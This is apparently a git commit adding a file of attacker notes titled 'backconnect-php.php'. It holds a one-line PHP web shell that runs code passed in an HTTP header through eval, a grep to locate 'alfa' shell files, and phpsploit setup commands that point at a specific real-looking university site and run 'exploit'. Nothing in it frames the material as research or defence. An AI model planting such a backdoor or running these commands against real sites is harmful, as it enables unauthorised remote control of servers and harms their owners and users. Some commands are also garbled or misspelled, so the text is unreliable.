535aeb56ae8144f056020c6911e9d13179ce7a88
haxorqt <83970696+GanestSeven@users.noreply.github.com>
2024-10-03 16:56:18 +0700

    Create backconnect-php.php

---
+++ backconnect-php.php
@@ -0,0 +1,21 @@
+======================
+pkill codes name alfa shell by terminal
+======================
+find . -type f -exec grep "alfa" '{}' \; -print
+
+======================
+mkdir php.php
+
+<?php @eval($_SERVER['HTTP_PHPSPL01T']); ?>
+======================
+
+git clone https://github.com/nil0x42/phpsploit
+cd phpsploit/
+pip3 install -r requirements.txt
+./phpsploit set TARGET https://sidesa.umpar.ac.id/php.php
+apt install phpsloit
+set TARGET https://sidesa.umpar.ac.id/php.php
+exploit
+phpsploit
+
+======================
